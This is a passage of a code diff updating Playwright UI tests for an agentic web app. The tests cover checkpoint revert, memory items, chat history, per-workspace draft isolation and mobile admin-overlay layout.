+    frame.get_by_role("tab", name="Recovery", exact=True).click()
+    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
+    expect(frame.locator("#checkpoint-status")).to_contain_text("up to date")
+    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_be_visible()
+    frame.get_by_role("tab", name="Memory", exact=True).click()
+    frame.get_by_role("button", name="New memory", exact=True).click()
+    frame.locator("#memory-name").fill("scratch-note")
+    frame.locator("#memory-description").fill("Temporary note")
+    frame.locator("#memory-body").fill("Delete me via undo.")
+    frame.get_by_role("button", name="Save memory", exact=True).click()
+    expect(frame.locator(".memory-item", has_text="scratch-note")).to_be_visible()
+    frame.get_by_role("tab", name="Recovery", exact=True).click()
+    saved_point = frame.locator(".history-item", has_text="My saved checkpoint").first
+    page.once("dialog", lambda dialog: dialog.accept())
+    saved_point.get_by_role("button", name="Revert", exact=True).click()
+    frame.get_by_role("tab", name="Memory", exact=True).click()
+    expect(frame.locator(".memory-item", has_text="scratch-note")).to_have_count(0)
+    expect(frame.locator(".memory-item", has_text="weekly-cadence")).to_be_visible()
+
+    # The injected context block never appears in displayed chat bubbles.
+    frame.get_by_role("tab", name="Chat", exact=True).click()
+    frame.locator("#message").fill("Note my preferences.")
+    frame.get_by_role("button", name="Send message", exact=True).click()
+    expect(frame.locator("#chat-history")).to_contain_text("Note my preferences.")
+    expect(frame.locator("#chat-history")).not_to_contain_text("[Workspace context]")
+    # Leave a genuine unsent draft for the later cross-workspace isolation
+    # check. The submitted text above is correctly cleared after delivery.
+    frame.locator("#message").fill("Keep this unsent human draft.")
+
+    # Re-saving today updates the one manual slot instead of adding clutter.
+    frame.get_by_role("tab", name="Recovery", exact=True).click()
+    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
+    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
+    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_have_count(1)
+    expect(frame.locator(".history-item", has_text="Daily snapshot")).to_have_count(1)
+    frame.get_by_role("button", name="Go to app", exact=True).click()
+    # The manual point was saved after the generated refresh raised the count;
+    # whole-workspace recovery preserves that exact saved state.
+    expect(frame.locator(".metric strong")).to_have_text("3")
+
+    # A second workspace has a separate thread, bundle, data, and drafts.
+    frame.locator("#workspace-new-app").click()
+    expect(frame.locator("#admin-overlay")).to_be_visible()
+    expect(frame.locator("#admin-app-title")).to_have_text("app-2")
     page.once("dialog", lambda dialog: dialog.accept("Scratch app"))
     frame.get_by_role("button", name="Rename app", exact=True).click()
-    frame.get_by_role("button", name="Start building", exact=True).click()
+    expect(frame.locator("#admin-app-title")).to_have_text("Scratch app")
     frame.locator("#message").fill("Build a separate scratch dashboard.")
     frame.get_by_role("button", name="Send message", exact=True).click()
-    expect(frame.locator(".dashboard")).to_be_visible(timeout=8_000)
-    expect(frame.locator(".dashboard h1")).to_have_text("Scratch app")
+    expect(frame.locator(".dashboard h1")).to_have_text("Scratch app", timeout=8_000)
     frame.locator("#message").fill("Keep this scratch-app draft.")
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-    expect(frame.locator(".metric strong")).to_have_text("2")
-
-    frame.locator(".app-item", has_text="Weekly focus").click()
+    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
     expect(frame.locator(".metric strong")).to_have_text("3")
-    frame.get_by_role("button", name="Agent chat", exact=True).click()
+    frame.locator("#admin-open").click()
     expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")
     expect(frame.locator("#chat-history")).not_to_contain_text(
         "separate scratch dashboard"
     )
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-
-    frame.locator(".app-item", has_text="Scratch app").click()
-    expect(frame.locator(".metric strong")).to_have_text("2")
-    frame.get_by_role("button", name="Agent chat", exact=True).click()
+    frame.locator(".workspace-list-item", has_text="Scratch app").click()
+    frame.locator("#admin-open").click()
     expect(frame.locator("#message")).to_have_value("Keep this scratch-app draft.")
     expect(frame.locator("#chat-history")).to_contain_text(
         "separate scratch dashboard"
     )
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-    frame.locator(".app-item", has_text="Weekly focus").click()
+    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
+    expect(frame.locator(".dashboard")).to_be_visible()
+    page.get_by_role("button", name="Back to host", exact=True).click()
+    expect(page.locator("body")).not_to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
+    expect(page.locator("#panel-home")).to_be_visible()
 
 
 def mobile_smoke(page: Any) -> None:
@@ -794,33 +1302,40 @@ def mobile_smoke(page: Any) -> None:
 
     page.locator("#mobile-nav-toggle").click()
     page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
+    expect(page.locator("body")).to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
+    expect(page.get_by_role("button", name="Back to host", exact=True)).to_be_visible()
     frame = page.frame_locator('iframe[title="Agentic Web App"]')
-    frame.get_by_role("button", name="Show app list", exact=True).click()
-    frame.get_by_role("button", name="Weekly focus", exact=False).click()
+    expect(frame.get_by_role("complementary", name="All apps", exact=True)).to_be_visible()
+    frame.get_by_role("button", name="Close all apps", exact=True).click()
+    expect(frame.get_by_role("button", name="All apps", exact=True)).to_be_visible()
+    expect(frame.locator("#home-view")).to_be_visible()
+    frame.get_by_role("button", name="All apps", exact=True).click()
+    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
     expect(frame.locator(".dashboard")).to_be_visible()
+    expect(frame.locator("#admin-open")).to_be_visible()
+    frame.locator("#admin-open").click()
+    expect(frame.locator("#admin-overlay")).to_be_visible()
     expect(frame.locator("#runtime")).to_be_visible()
     expect(frame.locator("#model")).to_be_visible()
     expect(frame.locator("#effort")).to_be_visible()
     expect(frame.locator("#runtime")).to_be_enabled()
-    expect(frame.locator("#model")).to_be_enabled()
-    expect(frame.locator("#effort")).to_be_enabled()
-    frame.get_by_role("button", name="Agent chat", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_visible()
-    frame.get_by_role("button", name="Close agent chat", exact=True).click()
-    expect(frame.locator("#chat-drawer")).to_be_hidden()
+    frame.get_by_role("tab", name="Schedules", exact=True).click()
+    expect(frame.locator(".schedule-card", has_text="Morning review")).to_be_visible()
+    frame.get_by_role("tab", name="Recovery", exact=True).click()
+    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_be_visible()
+    expect(frame.get_by_role("button", name="Save checkpoint", exact=True)).to_be_visible()
+    touch_heights = frame.locator(
+        "#admin-close, .admin-tab, #checkpoint-save, .history-revert"
+    ).evaluate_all("elements => elements.map(element => element.getBoundingClientRect().height)")
+    if any(height < 43 for height in touch_heights):
+        raise AssertionError(f"mobile admin controls are too short: {touch_heights}")
+    frame.get_by_role("button", name="Go to app", exact=True).click()
+    expect(frame.locator("#admin-overlay")).to_be_hidden()
     overflow = frame.locator("html").evaluate(
         "() => document.documentElement.scrollWidth - document.documentElement.clientWidth"
     )
     if overflow > 1:
         raise AssertionError(f"Agentic Web App overflows horizontally by {overflow}px")
 
-    # Archiving hides the workspace without deleting its bundle or thread.
-    frame.get_by_role("button", name="Archive", exact=True).click()
-    expect(frame.locator("#app-title")).to_have_text("Select an app")
-    frame.get_by_role("button", name="Show app list", exact=True).click()
-    frame.get_by_role("button", name="Show archived", exact=True).click()
-    frame.get_by_role("button", name="Weekly focus", exact=False).click()
-    expect(frame.locator(".dashboard")).to_be_visible()
-    expect(frame.locator("#generated-host")).to_have_class(re.compile(r"\breadonly\b"))
-    frame.get_by_role("button", name="Unarchive", exact=True).click()
-    expect(frame.locator("#app-title")).to_have_text("Archived apps")
+    page.get_by_role("button", name="Back to host", exact=True).click()
+    expect(page.locator("body")).not_to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
